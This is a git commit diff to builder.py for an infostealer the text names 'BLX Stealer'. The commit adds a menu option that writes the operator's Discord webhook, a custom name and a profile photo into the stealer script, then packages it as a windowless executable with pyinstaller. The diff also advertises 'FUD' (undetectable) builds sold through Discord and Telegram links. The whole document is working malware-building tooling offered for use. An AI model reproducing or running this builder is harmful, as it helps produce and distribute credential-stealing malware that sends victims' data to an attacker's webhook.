50d3398dcf04ddb093558228aa89c1f4dfb667ed
blx <71230025+blxstealer@users.noreply.github.com>
2023-10-21 13:19:05 +0300

    Add files via upload

--- builder.py
+++ builder.py
@@ -17,10 +17,13 @@ intro = """
 ██████╦╝███████╗██╔╝╚██╗  ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║
 ╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝
 
-       ╔═══════════════════════════════╗ ╔═══════════════════════════════╗
-       ║    https://discord.gg/blx     ║ ║    https://t.me/blxstealer    ║  
-       ╚═══════════════════════════════╝ ╚═══════════════════════════════╝    
-                
+       ╔═══════════════════════════════╗  ╔════════════════════════════════╗
+       ║    https://discord.gg/blx     ║  ║ https://discord.gg/blxservices ║  
+       ╚═══════════════════════════════╝  ╚════════════════════════════════╝    
+                        ╔═══════════════════════════════╗
+                        ║    https://t.me/blxstealer    ║ 
+                        ╚═══════════════════════════════╝
+        
             
             - Press Enter                                         
 """
@@ -48,8 +51,9 @@ while True:
     
     Write.Print("\nWhich option do you want to choose: ", Colors.red)
     Write.Print("\n1. Build .exe", Colors.red)
-    Write.Print("\n2. Build FUD .exe", Colors.red)
-    Write.Print("\n3. Close Builder", Colors.red)
+    Write.Print("\n2. Build Customizable .exe", Colors.red)
+    Write.Print("\n3. Build FUD .exe", Colors.red)
+    Write.Print("\n4. Close Builder", Colors.red)
     Write.Print("\nMake your selection: ", Colors.red, end="")
     choice = input()
 
@@ -69,7 +73,7 @@ while True:
         obfuscate = False
 
         while True:
-            answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+            answer = input(Fore.RED + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 if not obfuscate:
                     cmd = f"pyinstaller --onefile --windowed {filename}"
@@ -83,10 +87,75 @@ while True:
             else:
                 Write.Print("\nYou have entered invalid. Please try again.", Colors.red)
 
-    elif choice == "2":
-        Write.Print("\nYou can buy FUD on our Discord server. | discord.gg/blx", Colors.red)
+    elif choice == "2": 
+        answer = input(Fore.RED + "\nDo you want to change profile photo of BLX Stealer? (Y/N) " + Style.RESET_ALL)
+        if answer.upper() == "Y":
+            os.system("cls || clear")
+            pfp = input(Fore.RED + "\nEnter Your Link Of New Profile Photo: " + Style.RESET_ALL)
+
+            filename = "blxstealer.py"
+            filepath = os.path.join(os.getcwd(), filename)
+            with open(filepath, "r", encoding="utf-8") as f:
+                content = f.read()
+            new_content = content.replace('"https://cdn.discordapp.com/attachments/1164188985569071217/1164211448512249856/blx.jpg?ex=65426367&is=652fee67&hm=9da4215ab4422fdbd4a3e2e271e9cbb4fa68feb9ebb79a3307c91ec483a8cf13&"', f'"{pfp}"')
+            with open(filepath, "w", encoding="utf-8") as f:
+                f.write(new_content)
+            Write.Print(f"\n{filename} file updated.", Colors.red)
+
+        elif answer.upper() == "N":
+            next
+
+        answer = input(Fore.RED + "\nDo you want to change name of BLX Stealer? (Y/N) " + Style.RESET_ALL)
+        if answer.upper() == "Y":
+            os.system("cls || clear")
+            newname = input(Fore.RED + "\nEnter New Name: " + Style.RESET_ALL)
+
+
+            filename = "blxstealer.py"
+            filepath = os.path.join(os.getcwd(), filename)
+            with open(filepath, "r", encoding="utf-8") as f:
+                content = f.read()
+            new_content = content.replace('"BLX Stealer | t.me/blxstealer"', f'"{newname}"')
+            with open(filepath, "w", encoding="utf-8") as f:
+                f.write(new_content)
+            Write.Print(f"\n{filename} file updated.", Colors.red)
+
+        elif answer.upper() == "N":
+            next
+
+        webhook = input(Fore.RED + "\nEnter Your Webhook: " + Style.RESET_ALL)
+        filename = "blxstealer.py"
+        filepath = os.path.join(os.getcwd(), filename)
+        with open(filepath, "r", encoding="utf-8") as f:
+            content = f.read()
+        new_content = content.replace('"YOUR WEBHOOK HERE"', f'"{webhook}"')
+        with open(filepath, "w", encoding="utf-8") as f:
+            f.write(new_content)
+        Write.Print(f"\n{filename} file updated.", Colors.red)
+
+        obfuscate = False
+
+        while True:
+            answer = input(Fore.RED + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
+            if answer.upper() == "Y":
+                if not obfuscate:
+                    cmd = f"pyinstaller --onefile --windowed {filename}"
+                else:
+                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
+                subprocess.call(cmd, shell=True)
+                Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red)
+                break
+            elif answer.upper() == "N":
+                break
+            else:
+                Write.Print("\nYou have entered invalid. Please try again.", Colors.red)
+
 
     elif choice == "3":
+        Write.Print("\nYou can buy FUD on our Discord server. | discord.gg/blx", Colors.red)
+
+
+    elif choice == "4":
         Write.Print("\nExiting the program...", Colors.red)
         break
 
